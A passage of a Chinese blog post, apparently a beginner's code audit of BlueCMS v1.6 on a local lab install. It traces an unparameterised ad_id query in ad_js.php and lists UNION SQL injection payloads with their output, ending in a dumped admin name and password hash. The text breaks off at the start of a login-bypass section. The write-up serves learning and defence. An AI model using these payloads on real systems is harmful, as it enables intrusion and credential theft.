@@ -1,0 +1,498 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="前言萌新刚开始学习PHP代码审计，选了个简单的练手CMS 本章使用BlueCMS v1.6作为代码审计 环境为 Win7 + PHPstudy 安装1.把下好的BlueCMS源码文件bluecms_src放到phpStudy的WWW目录下 2.访问本地：http:&#x2F;&#x2F;localhost&#x2F;bluecms_src&#x2F;， 能看到项目文件 3.访问地址：http:&#x2F;&#x2F;localhost&#x2F;bluecms_sr">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计：BlueCMSv1.6">
+<meta property="og:url" content="http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/index.html">
+<meta property="og:site_name" content="Dp0rt Blog">
+<meta property="og:description" content="前言萌新刚开始学习PHP代码审计，选了个简单的练手CMS 本章使用BlueCMS v1.6作为代码审计 环境为 Win7 + PHPstudy 安装1.把下好的BlueCMS源码文件bluecms_src放到phpStudy的WWW目录下 2.访问本地：http:&#x2F;&#x2F;localhost&#x2F;bluecms_src&#x2F;， 能看到项目文件 3.访问地址：http:&#x2F;&#x2F;localhost&#x2F;bluecms_sr">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251454337.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251503538.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307260959199.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251713722.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251713596.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251717430.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251724082.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251724998.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251740673.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251743117.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251749783.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251750023.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251753155.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261022856.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261022926.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261104645.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261109458.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261109420.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261110292.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261536159.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261537891.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261538760.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261540597.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261544095.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261548997.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261550017.png">
+<meta property="og:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307261619560.png">
+<meta property="article:published_time" content="2023-07-25T06:29:26.000Z">
+<meta property="article:modified_time" content="2023-07-26T08:57:03.955Z">
+<meta property="article:author" content="Dp0rt">
+<meta property="article:tag" content="代码审计">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251454337.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>代码审计：BlueCMSv1.6</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">主页</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/tags/">标签</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于我</a></li><!--
+     --><!--
+       --><li><a href="/friends/">友链</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2023/07/16/%E6%9F%90%E5%90%8E%E5%8F%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A00Day/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&text=代码审计：BlueCMSv1.6"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&title=代码审计：BlueCMSv1.6"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&is_video=false&description=代码审计：BlueCMSv1.6"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=代码审计：BlueCMSv1.6&body=Check out this article: http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&title=代码审计：BlueCMSv1.6"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&title=代码审计：BlueCMSv1.6"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&title=代码审计：BlueCMSv1.6"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&title=代码审计：BlueCMSv1.6"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&name=代码审计：BlueCMSv1.6&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2023/07/25/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9ABlueCMSv1.6/&t=代码审计：BlueCMSv1.6"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AE%89%E8%A3%85"><span class="toc-number">1.1.</span> <span class="toc-text">安装</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81SQL%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%89%8D%E5%8F%B0Union%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.1.</span> <span class="toc-text">1、SQL注入：前台Union注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.1.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81SQL%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%90%8E%E5%8F%B0%E7%99%BB%E5%BD%95%E4%B8%87%E8%83%BD%E5%AF%86%E7%A0%81"><span class="toc-number">1.2.2.</span> <span class="toc-text">2、SQL注入：后台登录万能密码</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-1"><span class="toc-number">1.2.2.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3%E3%80%81SQL%E6%B3%A8%E5%85%A5%EF%BC%9A%E5%90%8E%E5%8F%B0Union%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.3.</span> <span class="toc-text">3、SQL注入：后台Union注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-2"><span class="toc-number">1.2.3.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4%E3%80%81XSS%EF%BC%9A%E5%90%8E%E5%8F%B0%E6%96%B0%E9%97%BB%E5%8F%91%E5%B8%83%E5%A4%84%E5%AD%98%E5%82%A8%E5%9E%8B"><span class="toc-number">1.2.4.</span> <span class="toc-text">4、XSS：后台新闻发布处存储型</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-3"><span class="toc-number">1.2.4.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.2.5.</span> <span class="toc-text">5、文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-4"><span class="toc-number">1.2.5.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6%E3%80%81SQL%E6%B3%A8%E5%85%A5%EF%BC%9AXFF%E5%A4%B4%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.6.</span> <span class="toc-text">6、SQL注入：XFF头注入</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-5"><span class="toc-number">1.2.6.1.</span> <span class="toc-text">利用</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#7%E3%80%81%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4"><span class="toc-number">1.2.7.</span> <span class="toc-text">7、任意文件删除</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.3.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        代码审计：BlueCMSv1.6
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Dp0rt</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-07-25T06:29:26.000Z" class="dt-published" itemprop="datePublished">2023-07-25</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>萌新刚开始学习PHP代码审计，选了个简单的练手CMS</p>
+<p>本章使用BlueCMS v1.6作为代码审计</p>
+<p>环境为 Win7 + PHPstudy</p>
+<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>1.把下好的<code>BlueCMS</code>源码文件<code>bluecms_src</code>放到<code>phpStudy</code>的<code>WWW</code>目录下</p>
+<p>2.访问本地：<code>http://localhost/bluecms_src/</code>， 能看到项目文件</p>
+<p>3.访问地址：<code>http://localhost/bluecms_src/uploads/install/</code> 就会进入到安装界面,按照提示配置好参数，注意数据库用户名和密码要与你的mysql匹配</p>
+<p>4.再访问：<code>http://localhost/bluecms_src/uploads/</code>，可以看到已经安装好了</p>
+<h3 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h3><p>我们使用Seay源代码审计系统自动审计下，我们可以发现有很多漏洞，我们追溯分析查看</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251454337.png" alt="image-20230725145359228"></p>
+<h4 id="1、SQL注入：前台Union注入"><a href="#1、SQL注入：前台Union注入" class="headerlink" title="1、SQL注入：前台Union注入"></a>1、SQL注入：前台Union注入</h4><p>漏洞点： <code>ad_js.php</code></p>
+<p>seay审计选中可能存在注入点，就能直接定位到位置</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307251503538.png" alt="image-20230725150103076"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require_once</span> <span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>) . <span class="string">&#x27;/include/common.inc.php&#x27;</span>;</span><br><span class="line"><span class="variable">$ad_id</span> = !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$ad</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="string">&quot;SELECT * FROM &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;ad&#x27;</span>).<span class="string">&quot; WHERE ad_id =&quot;</span>.<span class="variable">$ad_id</span>);</span><br></pre></td></tr></table></figure>
+
+<p>文件引用了<code>/include/common.inc.php</code> ，跳转过去看看</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$_POST</span> = <span class="title function_ invoke__">deep_addslashes</span>(<span class="variable">$_POST</span>);</span><br><span class="line">	<span class="variable">$_GET</span> = <span class="title function_ invoke__">deep_addslashes</span>(<span class="variable">$_GET</span>);</span><br><span class="line">	<span class="variable">$_COOKIES</span> = <span class="title function_ invoke__">deep_addslashes</span>(<span class="variable">$_COOKIES</span>);</span><br><span class="line">	<span class="variable">$_REQUEST</span> = <span class="title function_ invoke__">deep_addslashes</span>(<span class="variable">$_REQUEST</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这段代码是如果说php在没有开启<code>get_magic_quotes_gpc</code>的情况下，就将POST，GET，COOKIE，REQUEST传递的参数全部用<code>deep_addslashes</code>函数处理一遍。</p>
+<p>追踪下<code>deep_addslashes()</code>函数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deep_addslashes</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$str</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">foreach</span>(<span class="variable">$str</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$str</span>[<span class="variable">$key</span>] = <span class="title function_ invoke__">deep_addslashes</span>(<span class="variable">$val</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$str</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$str</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>deep_addslashes</code>对传入的数组进行递归地添加转义斜杠，如果不为数组则调用本身的<code>addslashes</code>进行过滤</p>
+<p>回到注入点继续分析， <code>$ad_id</code> 没有使用单引号双引号包括，所以<code>addslashes()</code>函数不起作用</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ad_id</span> = !<span class="keyword">empty</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) ? <span class="title function_ invoke__">trim</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ad_id&#x27;</span>]) : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$ad</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="string">&quot;SELECT * FROM &quot;</span>.<span class="title function_ invoke__">table</span>(<span class="string">&#x27;ad&#x27;</span>).<span class="string">&quot; WHERE ad_id =&quot;</span>.<span class="variable">$ad_id</span>);</span><br></pre></td></tr></table></figure>
+
+<p><code>getone()</code> 是自定义函数，<code>getone()</code> 方法位于 <code>/include/mysql.class.php</code> 第61行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getone</span>(<span class="params"><span class="variable">$sql</span>, <span class="variable">$type</span>=MYSQL_ASSOC</span>)</span>&#123;</span><br><span class="line">   	<span class="variable">$query</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>,<span class="variable">$this</span>-&gt;linkid);</span><br><span class="line">    <span class="variable">$row</span> = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$query</span>, <span class="variable">$type</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$row</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>代码作用是执行SQL语句并返回第一条结果</p>
+<p>传入的参数<code>$ad_id</code> 先判断是否为空，不为空使用<code>trim</code> 去除首位空格，没有过滤直接带入数据库执行，所以存在<code>SQL</code>注入，在 <code>ad_js.php</code> 最后一行将结果输出到了html代码注释中</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;!--\r\ndocument.write(\&quot;&quot;</span>.<span class="variable">$ad_content</span>.<span class="string">&quot;\&quot;);\r\n--&gt;\r\n&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">#判断注入点</span><br><span class="line">ad_js.php?ad_id=1 and 1=1	#正常</span><br><span class="line">ad_js.php?ad_id=1 and 1=j	#报错</span><br><span class="line"></span><br><span class="line">#判断字段长度</span><br><span class="line">ad_js.php?ad_id=1 order by 7	#正常</span><br><span class="line">ad_js.php?ad_id=1 order by 8	#报错</span><br><span class="line">···</span><br><span class="line">字段数为7</span><br><span class="line">···</span><br><span class="line"></span><br><span class="line">#判断回显位</span><br><span class="line">ad_js.php?ad_id=1 union select 1,2,3,4,5,6,7</span><br><span class="line">···</span><br><span class="line">页面回显空白，查看源代码可以发现回显了个7，所以回显位为第七位</span><br><span class="line">&lt;!--</span><br><span class="line">document.write(&quot;7&quot;);</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">#获取库名</span><br><span class="line">ad_js.php?ad_id=1 union select 1,2,3,4,5,6,database()</span><br><span class="line">···</span><br><span class="line">bluecms</span><br><span class="line">···</span><br><span class="line"></span><br><span class="line">#获取表名</span><br><span class="line">ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br><span class="line">···</span><br><span class="line">&lt;!--</span><br><span class="line">document.write(&quot;blue_ad,blue_ad_phone,blue_admin,blue_admin_log,blue_ann,blue_ann_cat,blue_arc_cat,blue_area,blue_article,blue_attachment,blue_buy_record,blue_card_order,blue_card_type,blue_category,blue_comment,blue_config,blue_flash_image,blue_guest_book,blue_ipbanned,blue_link,blue_model,blue_navigate,blue_pay,blue_post,blue_post_att,blue_post_pic,blue_service,blue_task,blue_user&quot;);</span><br><span class="line">--&gt;</span><br><span class="line">···</span><br><span class="line"></span><br><span class="line">#获取blue_admin字段名</span><br><span class="line">ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(column_name) from information_schema.columns where table_name=0x626c75655f61646d696e</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">这里需要将blue_admin转为十六进制格式，不然会被转义</span><br><span class="line">&lt;!--</span><br><span class="line">document.write(&quot;admin_id,admin_name,email,pwd,purview,add_time,last_login_time,last_login_ip&quot;);</span><br><span class="line">--&gt;</span><br><span class="line">···</span><br><span class="line"></span><br><span class="line">#查看admin_name和pwd字段信息</span><br><span class="line">ad_js.php?ad_id=1 union select 1,2,3,4,5,6,group_concat(admin_name,0x3a,pwd) from blue_admin</span><br><span class="line">···</span><br><span class="line">&lt;!--</span><br><span class="line">document.write(&quot;admin:202cb962ac59075b964b07152d234b70&quot;);</span><br><span class="line">--&gt;</span><br><span class="line">···</span><br><span class="line">得到字段信息</span><br><span class="line">···</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="2、SQL注入：后台登录万能密码"><a href="#2、SQL注入：后台登录万能密码" class="headerlink" title="2、SQL注入：后台登录万能密码"></a>2、SQL注入：后台登录万能密码</h4><p>漏洞点：<code>/admin/login.php</code></p>
+<p>该CMS数据库使用gb2312编码，这有可能导致宽字节注入</p>
+<p><img src="https://bucket-img-0.oss-cn-shanghai.aliyuncs.com/img/1n8a9h9sd/202307260959199.png" alt="image-20230726095954142"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$act</span> == <span class="string">&#x27;login&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span 